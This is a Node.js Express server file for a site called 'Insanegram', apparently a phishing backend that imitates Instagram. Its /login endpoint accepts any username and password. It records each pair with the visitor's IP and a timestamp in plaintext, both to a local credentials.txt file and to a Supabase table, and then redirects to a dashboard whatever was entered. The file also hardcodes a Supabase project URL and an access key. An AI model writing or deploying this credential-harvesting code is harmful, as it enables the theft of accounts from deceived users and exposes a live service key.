const express = require('express');
const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');
const app = express();

// ========================================
// SUPABASE CONFIGURATION
// ========================================
// Replace these with your actual Supabase credentials
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://knldumqhmchzlvyccbzd.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtubGR1bXFobWNoemx2eWNjYnpkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0NzM2NTUsImV4cCI6MjA3NTA0OTY1NX0.hwDe2yt76437QnYA2pyTuTyNFEKxfU7tcUUy0MPVcCg';

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// ========================================
// MIDDLEWARE
// ========================================
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files from 'public' directory
app.use(express.static('public'));

// Create data directory if it doesn't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

// ========================================
// LOGIN ENDPOINT
// ========================================
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // Validate input
    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    const timestamp = new Date().toISOString();

    // Get IP address (handles proxies and forwarded IPs)
    const ip = (req.headers['x-forwarded-for'] ||
        req.headers['x-real-ip'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        'Unknown').split(',')[0].trim().replace('::ffff:', '');

    console.log(`📝 Login attempt: ${username} from IP ${ip}`);

    // ========================================
    // SAVE TO LOCAL FILE (credentials.txt)
    // ========================================
    const fileData = `username=${username};password=${password};ip=${ip};timestamp=${timestamp}\n`;
    const filePath = path.join(dataDir, 'credentials.txt');

    try {
        fs.appendFileSync(filePath, fileData);
        console.log('✓ Saved to credentials.txt');
    } catch (err) {
        console.error('❌ Error writing to file:', err);
    }

    // ========================================
    // SAVE TO SUPABASE DATABASE
    // ========================================
    try {
        const { data, error } = await supabase
            .from('login_credentials')  // Your table name
            .insert([
                {
                    username: username,
                    password: password,
                    ip_address: ip,
                    login_timestamp: timestamp
                }
            ]);

        if (error) {
            console.error('❌ Supabase error:', error);
        } else {
            console.log('✓ Saved to Supabase database');
        }
    } catch (err) {
        console.error('❌ Error connecting to Supabase:', err);
    }

    // ========================================
    // REDIRECT TO DASHBOARD
    // ========================================
    // Always redirect to dashboard regardless of credentials
    console.log(`✓ Redirecting to dashboard: ${username}`);
    res.redirect(`/dashboard.html?username=${encodeURIComponent(username)}`);
});

// ========================================
// HEALTH CHECK ENDPOINT (for Render)
// ========================================
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        supabase: SUPABASE_URL ? 'Connected' : 'Not configured'
    });
});

// ========================================
// START SERVER
// ========================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Insanegram server running on port ${PORT}`);
    console.log(`📁 Data directory: ${dataDir}`);
    console.log(`🔗 Supabase URL: ${SUPABASE_URL}`);
});
